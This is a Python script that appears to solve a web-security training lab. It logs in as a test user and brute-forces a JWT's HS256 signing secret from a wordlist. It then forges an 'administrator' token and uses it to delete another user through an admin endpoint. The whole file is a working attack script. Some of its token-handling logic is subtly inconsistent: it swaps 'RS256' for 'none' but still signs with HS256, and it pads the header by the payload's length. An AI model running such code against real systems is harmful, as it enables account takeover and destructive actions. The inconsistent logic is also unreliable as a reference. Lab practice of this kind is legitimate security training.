import sys
import requests
import re
import hmac
import hashlib
import queue as q
import multiprocessing
import base64


class Solver:
    def __init__(self, lab_url, wordlist_path):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.wordlist_path = wordlist_path

    def get_csrf(self):
        response = requests.get(self.lab_url + 'login')
        return re.search('value="(.*)"', response.text).group(1)

    def get_jwt_token(self):
        data = {'csrf': self.get_csrf(), 'username': 'wiener', 'password': 'peter'}
        session = requests.Session()
        session.post(self.lab_url + 'login', data=data)
        return session.cookies['session']

    @staticmethod
    def generate_hs256_signature(secret_key, data):
        secret_key = bytes(secret_key, 'utf-8')
        data = bytes(data, 'utf-8')
        signature = hmac.new(secret_key, data, hashlib.sha256).digest()
        return base64.urlsafe_b64encode(signature).decode().rstrip('=')

    def worker(self, queue, flag, signature, data, result_queue):
        while True:
            if not flag.value:
                try:
                    secret_key = queue.get_nowait()
                except q.Empty:
                    break
                else:
                    if self.generate_hs256_signature(secret_key, data) == signature:
                        flag.value = True
                        result_queue.put(secret_key)
            else:
                break

    def creating_queue(self):
        queue = multiprocessing.Queue()
        with open(self.wordlist_path) as f:
            for line in f.readlines():
                secret_key = line.strip()
                queue.put(secret_key)
        return queue

    def generate_malicious_token(self):
        token = self.get_jwt_token()
        header, payload, signature = token.split('.')
        data = header + '.' + payload
        queue = self.creating_queue()
        result_queue = multiprocessing.Queue()
        flag = multiprocessing.Value('b', False)
        processes = []
        for i in range(10):
            process = multiprocessing.Process(target=self.worker, args=(queue, flag, signature, data, result_queue))
            processes.append(process)
            process.start()
        for process in processes:
            process.join()
        header += '=' * (len(payload) % 4)
        payload += '=' * (len(payload) % 4)
        header = base64.urlsafe_b64decode(header)
        header = header.replace(b'RS256', b'none')
        header = base64.urlsafe_b64encode(header).rstrip(b'=')
        payload = base64.urlsafe_b64decode(payload)
        payload = payload.replace(b'wiener', b'administrator')
        payload = base64.urlsafe_b64encode(payload).rstrip(b'=')
        new_data = header.decode() + '.' + payload.decode()
        return (header.decode() + '.' + payload.decode() + '.' +
                self.generate_hs256_signature(result_queue.get(), new_data))

    def delete_the_user(self):
        cookies = {'session': self.generate_malicious_token()}
        response = requests.get(self.lab_url + 'admin/delete?username=carlos', cookies=cookies)
        if 'wiener' in response.text and 'carlos' not in response.text:
            print('You solved the lab.')
            print('Coded by Mohamed Ahmed (ma4747gh).')
            print('My GitHub account: https://github.com/ma4747gh')
            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def start(self):
        self.delete_the_user()


solver = Solver(sys.argv[1], sys.argv[2])
solver.start()
